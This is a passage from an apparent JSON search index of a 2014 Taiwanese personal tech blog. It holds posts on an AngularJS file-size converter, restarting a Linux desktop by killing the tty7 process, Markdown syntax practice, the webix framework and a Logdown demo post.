\u003c!doctype html\u003e \u003chtml lang=\"zh-TW\" ng-app\u003e \u003chead\u003e \u003cscript src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0-beta.11/angular.min.js\"\u003e\u003c/script\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003e簡易檔案計算程式 WEB\u003c/title\u003e \u003cscript\u003e function select_all(){ var textBox = document.getElementById(\"foo\"); textBox.focus(); textBox.select(); } showFileData =function ($scope){ $scope.test = function(){ if ($scope.isShowGB) { if ($scope.fileGBMB==\"GB\") { $scope.fileData = $scope.fileNumber+\"GB\"; }else{ $scope.fileData = Number($scope.fileNumber/1024).toFixed(1)+\"GB\"; } }else{ if ($scope.fileGBMB==\"GB\") { $scope.fileData = Number($scope.fileNumber*1024).toFixed(0)+\"MB\"; }else{ $scope.fileData = $scope.fileNumber+\"MB\"; } } } } \u003c/script\u003e \u003c/head\u003e \u003cbody style=\"margin: 10px auto; width:90%;line-height:36px;background-color:#e6e6e6\" ng-controller=\"showFileData\" ng-form=\"form1\"\u003e \u003cinput type=\"checkbox\" ng-model=\"isShowGB\" ng-change=\"test()\" /\u003e顯示GB\u003cbr /\u003e 檔案大小：\u003cinput type=\"number\" ng-model=\"fileNumber\" ng-change=\"test()\" required /\u003e\u003cselect ng-model=\"fileGBMB\" ng-init=\"fileGBMB='GB'\" ng-change=\"test()\" required\u003e \u003coption value=\"GB\"\u003eGB\u003c/option\u003e \u003coption value=\"MB\"\u003eMB\u003c/option\u003e \u003c/select\u003e\u003cbr /\u003e \u003cdiv ng-hide=\"form1.$invalid\"\u003e{{fileData}}\u003c/div\u003e \u003cdiv ng-show=\"form1.$invalid\"\u003e\u003ch1\u003e必要欄位沒填!!!\u003c/h1\u003e\u003c/div\u003e \u003c/body\u003e \u003c/html\u003e 本實驗只有用到 ng-model ng-controller ng-click ng-init ng-change ng-form ng-show / ng-hide 這次表單驗證是利用AngularJS內鍵功能來實作，form1.$invalid會傳會現在欄位是否真入正確值，還會查看HTMLtype是否符合型態，ng-show 透過這次簡單的實驗發現AngularJS是一個很實用的工具，不知道是不是JQuery Selector用習慣的係，有時候控制裡面的原件都不知道如何去控制ng-show/ng-hide來顯示出結果要呈現。 Google搜尋到不錯30天學AngularJS教學 http://ithelp.ithome.com.tw/question/10132196 ","date":"2014-06-14","objectID":"/blog/posts/logdown/2014-06-14-angularjs-novice-trial/:0:0","tags":["AngularJS"],"title":"AngularJS新手小試","uri":"/blog/posts/logdown/2014-06-14-angularjs-novice-trial/"},{"categories":["Linux"],"content":"最近使用Ezgo 11有時都會當機不動… 最後都跳到tty1直接sudo reboot 後來在想有沒有重啟桌面不重新開機方法… 在經過一直Google下最終找到了方法 :D ps aux |grep tty 7 sudo kill {tty7 id} 原來就殺掉tty就會自動重啟!!!! ","date":"2014-06-11","objectID":"/blog/posts/logdown/2014-06-11-reboot-the-linux-desktop/:0:0","tags":["Linux","tty"],"title":"重啟Linux桌面方法","uri":"/blog/posts/logdown/2014-06-11-reboot-the-linux-desktop/"},{"categories":["Markdown"],"content":"在前幾年有Markdown這個東西，有嘗試著練習。不過…太久沒用了，也沒有實戰用到…，所以全部忘光光囧，但最近看到LogDown這個玩意，就突然想寫寫看。 LogDown是台灣xdite大大做的，也算是台灣之光，所以也來支持一下^^ #標題寫法 標題寫法(最高階) === or 標題寫法(第二階) --- or #標題寫法 引用 \u003e引用 引用 區塊引用 \u003e引用 \u003e\u003e區塊引用 清單 + 清單 or - 清單 or * 清單 PHP Python Ruby on Rails 1. PHP 2. Python 3. Ruby on Rails This is a list item with two paragraphs. This is the second paragraph in the list item. You’re only required to indent the first line. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Another item in the same list. * This is a list item with two paragraphs. This is the second paragraph in the list item. You're (前面空白可縮白) only required to indent the first line. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. * Another item in the same list. test test * test \u003etest(前面四個空白) 1986. What a great season. 1986\\. What a great season. This is a Google Url . This is a [Google Url ](http://google.com.tw). This is a 相對位置 url. This is a 絕對位置 url. This is a 相對位置 [url](test). This is a 絕對位置 [url](/test/). This is a [Google URL][Google]. This is a [谷歌][谷歌].(id:中文也可以) [Google]: http://google.com.tw “Google” [谷歌]: http://google.com.tw “谷歌” This is a \\[Google URL\\]\\[Google\\]. This is a \\[Google URL\\]\\[google]\\. This is a \\[谷歌]\\[谷歌].(id:中文也可以，不區分大小寫) \\[Google]: http://google.com.tw \"Google\" \\[谷歌]: http://google.com.tw \"谷歌\" 連結Google可以省略寫成 [Google][] [Google]:http://google.com.tw \\[Google][] \\[Google]:http://google.com.tw *em* __strong__ ls -l(一行顯示) `ls -l` This is a (用法跟一般連結差不多) This is a ![Chrome Image](https://www.google.com.tw/images/icons/product/chrome-48.png) 單一*或_包圍字串會轉成\u003cem\u003e 兩個*或_包圍字串\u003cstrong\u003e em strong strike *em* __strong__ ~~strike~~ {% blockquote Author Name %} Flying is learning how to throw yourself at the ground and miss. {% endblockquote %} {% blockquote Author Name https://example.com/quotation/source/link %} Over the past 24 hours I’ve been reflecting on my life \u0026 I’ve realized only one thing. I need a medieval battle axe. {% endblockquote %} {% blockquote Author Name %} Flying is learning how to throw yourself at the ground and miss. {% endblockquote %} \\{% blockquote Author Name https://example.com/quotation/source/link %} Over the past 24 hours I've been reflecting on my life \u0026 I've realized only one thing. I need a medieval battle axe. {% endblockquote %} 第一欄 第二欄 第三欄 第一格 第二格 第三格 第一格 第二格 第三格 |第一欄|第二欄|第三欄| -------|:-------:|:--------:| |第一格|第二格|第三格| |第一格|第二格|第三格| test 1+1=2 有些用Markdown包起```來好像怪怪的，不知道是不是我寫錯的關係。以前也不知道Markdown也能寫表格XD 希望以後這些我前用的到。 ","date":"2014-06-05","objectID":"/blog/posts/logdown/2014-06-05-markdown-rookie-scale/:0:0","tags":["Markdown"],"title":"Markdown新手小試","uri":"/blog/posts/logdown/2014-06-05-markdown-rookie-scale/"},{"categories":["Web-UI"],"content":"#webix 這個白俄羅斯人寫的 UI Framework 有點強大呀！整合了 Backbone.js 與 AngularJS ，光看首頁的 Demo (不是圖片動畫喔) 就讓人好熱血！ http://webix.com/ 在Jace Ju的FB看到不錯好工具，先記錄一下，有空去實作看看。^^ ","date":"2014-05-28","objectID":"/blog/posts/logdown/2014-05-28-webix-powerful-web-ui-framework/:0:0","tags":["Web-UI","webix"],"title":"webix-強大WEB UI Framework","uri":"/blog/posts/logdown/2014-05-28-webix-powerful-web-ui-framework/"},{"categories":null,"content":"Hi, This a demo post of Logdown. Logdown use Markdown as main syntax, you can find more example by reading this document on Wikipedia Logdown also support drag \u0026 drop image uploading. The picture syntax is like this: ","date":"2014-05-27","objectID":"/blog/posts/logdown/2014-05-27-hello-world/:0:0","tags":null,"title":"Hello World","uri":"/blog/posts/logdown/2014-05-27-hello-world/"},{"categories":null,"content":"Bloging with code snippet: inline code ","date":"2014-05-27","objectID":"/blog/posts/logdown/2014-05-27-hello-world/:1:0","tags":null,"title":"Hello World","uri":"/blog/posts/logdown/2014-05-27-hello-world/"},{"categories":null,"content":"Plain Code puts \"Hello World!\" ","date":"2014-05-27","objectID":"/blog/posts/logdown/2014-05-27-hello-world/:1:1","tags":null,"title":"Hello World","uri":"/blog/posts/logdown/2014-05-27-hello-world/"},{"categories":null,"content":"Code with Language puts \"Hello World!\" ","date":"2014-05-27","objectID":"/blog/posts/logdown/2014-05-27-hello-world/:1:2","tags":null,"title":"Hello World","uri":"/blog/posts/logdown/2014-05-27-hello-world/"},{"categories":null,"content":"Code with Title puts \"Hello World!\" ","date":"2014-05-27","objectID":"/blog/posts/logdown/2014-05-27-hello-world/:1:3","tags":null,"title":"Hello World","uri":"/blog/posts/logdown/2014-05-27-hello-world/"},{"categories":null,"content":"MathJax Example ","date":"2014-05-27","objectID":"/blog/posts/logdown/2014-05-27-hello-world/:2:0","tags":null,"title":"Hello World","uri":"/blog/posts/logdown/2014-05-27-hello-world/"},{"categories":null,"content":"Mathjax x = \\dfrac{-b \\pm \\sqrt{b^2 - 4ac}}{2a} ","date":"2014-05-27","objectID":"/blog/posts/logdown/2014-05-27-hello-world/:2:1","tags":null,"title":"Hello World","uri":"/blog/posts/logdown/2014-05-27-hello-world/"},{"categories":null,"content":"Inline Mathjax The answser is $a^2 + b^2 = c^2$. ","date":"2014-05-27","objectID":"/blog/posts/logdown/2014-05-27-hello-world/:2:2","tags":null,"title":"Hello World","uri":"/blog/posts/logdown/2014-05-27-hello-world/"},{"categories":null,"content":"Table Example Tables Are Cool col 1 Hello $1600 col 2 Hello $12 col 3 Hello $1 ","date":"2014-05-27","objectID":"/blog/posts/logdown/2014-05-27-hello-world/:3:0","tags":null,"title":"Hello World","uri":"/blog/posts/logdown/2014-05-27-hello-world/"}]